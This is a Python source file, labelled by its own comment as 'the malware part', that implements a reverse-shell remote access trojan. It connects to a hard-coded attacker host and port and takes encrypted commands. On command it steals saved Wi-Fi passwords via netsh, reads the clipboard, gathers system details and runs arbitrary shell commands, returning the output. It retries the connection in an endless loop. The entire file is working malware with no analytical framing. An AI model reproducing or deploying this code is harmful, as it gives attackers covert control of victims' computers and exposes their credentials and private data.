# This is the malware part
import os
import socket
import subprocess
import time
import random
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import psutil
import platform
import pyperclip
from datetime import datetime

# Encryption key
key = b"zj20~IlF+dhg33.+,ZHqGL)f\oH4F$b&"
IV = b"MqvxhvaY2&Hhw!H@"


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# Get the system information and version
def GetSysInfo():
    uname = platform.uname()
    spacer = "=" * 50
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    cpufreq = psutil.cpu_freq()
    svmem = psutil.virtual_memory()
    swap = psutil.swap_memory()
    Data = f"{spacer}\nSystem information:\n{spacer}\nSystem OS: {uname.system} \nNode Name: {uname.node} \nRelease: {uname.release} \nVersion: {uname.version} \nMachine: {uname.machine} \nProcessor: {uname.processor} \n{spacer}\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" \
        f"\n{spacer}\nCPU Info:\nPhysical cores: {psutil.cpu_count(logical=False)}\nTotal cores: {psutil.cpu_count(logical=True)}" \
        f"\nMas Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\nCurrent Frequency: {cpufreq.current:.2f}Mhz" \
        f"\nCpu Usage Per Core: \n"
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        Data = Data + f"Core {i}: {percentage}%\n"

    Data2 = f"Total CPU Usage: {psutil.cpu_percent()}% \n{spacer}\nMemory Information\n{spacer}\nTotal: {get_size(svmem.total)}\nAvailable: {get_size(svmem.available)}\nUsed: {get_size(svmem.used)}\nPercentage: {svmem.percent}%\n{spacer}\n" \
                f"Swap:\n{spacer}\nTotal: {get_size(swap.total)}\nFree: {get_size(swap.free)}\nUsed: {get_size(swap.used)}\nPercentage: {swap.percent}%\n" \
                f"{spacer}\nDisk Information:"

    partitions = psutil.disk_partitions()
    for partition in partitions:
        Data2 = Data2 + f"=== Device: {partition.device} ==="
        Data2 = Data2 + f"  Mountpoint: {partition.mountpoint}"
        Data2 = Data2 + f"  File system type: {partition.fstype}"
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        Data2 = Data2 + f"\nTotal Size: {get_size(partition_usage.total)}\nUsed: {get_size(partition_usage.used)}\nFree: {get_size(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n"
    disk_io = psutil.disk_io_counters()
    # get IO statistics since boot
    Data2 = Data2 + f"Total read: {get_size(disk_io.read_bytes)}\nTotal write: {get_size(disk_io.write_bytes)}\n{spacer}"

    return [Data, Data2]

# Encrypt the data
def encrypt(message):
    try:
        encryptor = AES.new(key, AES.MODE_CBC, IV)
        padded_message = Padding.pad(message, 16)
        encrypted_message = encryptor.encrypt(padded_message)
        return encrypted_message
    except Exception:
        return ""


# Decrypt the data
def decrypt(cipher):
    try:
        decryptor = AES.new(key, AES.MODE_CBC, IV)
        decrypted_padded_message = decryptor.decrypt(cipher)
        decrypted_message = Padding.unpad(decrypted_padded_message, 16)
        return decrypted_message
    except Exception:
        return ""


# Get Wifi passwords
def hijack(sock):
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode().split('\n')
    wifis = [line.split(':')[1][1:-1] for line in data if 'All User Profile' in line]

    for wifi in wifis:
        res = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split(
            '\n')
        for line in res:
            if 'Key Content' in line:
                res = [line.split(':')[1][1:-1]]

        try:
            go = "name: " + wifi + ", Password " + res[0]
            sock.send(encrypt(go.encode()))
        except:
            go = f'name:{wifi} , Password UnKnown'
            sock.send(encrypt(go.encode()))


# Connect loop
def connect():
    sock = socket.socket()
    # ip
    ip = "192.168.1.21"
    # port
    port = 8080
    sock.connect((ip, port))
    while True:
        command = decrypt(sock.recv(1024))
        if 'exit' in command.decode() or 'byebye' in command.decode():
            sock.send(encrypt("byebye".encode()))
            sock.close()
            return 0
        elif 'gwifi' in command.decode():
            hijack(sock)
        elif 'getsinfo' in command.decode():
            sock.send(encrypt("getsinfo".encode()))
            dat, dat2 = GetSysInfo()
            sock.send(encrypt(dat.encode()))
            time.sleep(1)
            sock.send(encrypt(dat2.encode()))
            sock.send(encrypt("finito".encode()))
        elif 'getclip' in command.decode():
            try:
                clip = "--------------------------------------------\nGetting clipboard: " + pyperclip.paste()
                clip = clip.encode()
                sock.send(encrypt(clip))
                continue
            except:
                continue
        elif 'cd' in command.decode():
            if '*' not in command.decode():
                sock.send(encrypt("Error: Proper usage is cd*[path]".encode()))
                continue
            code, directory = command.decode().split('*')
            try:
                os.chdir(directory)
                sock.send(encrypt(('[+] CWD is ' + os.getcwd()).encode()))
            except Exception as e:
                sock.send(encrypt(('[-]  ' + str(e)).encode()))
        else:
            try:
                cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                sock.send(encrypt(cmd.stdout.read()))
                sock.send(encrypt(cmd.stderr.read()))
            except Exception:
                sock.send(encrypt(("Error: exception cause by " + str(command.encode()))))


# Main function
def main():
    while True:
        try:
            if connect() == 0:
                randomwait = random.randrange(1, 20)
                time.sleep(randomwait)
        except:
            randomwait = random.randrange(1, 20)
            time.sleep(randomwait)


# Run the program
main()
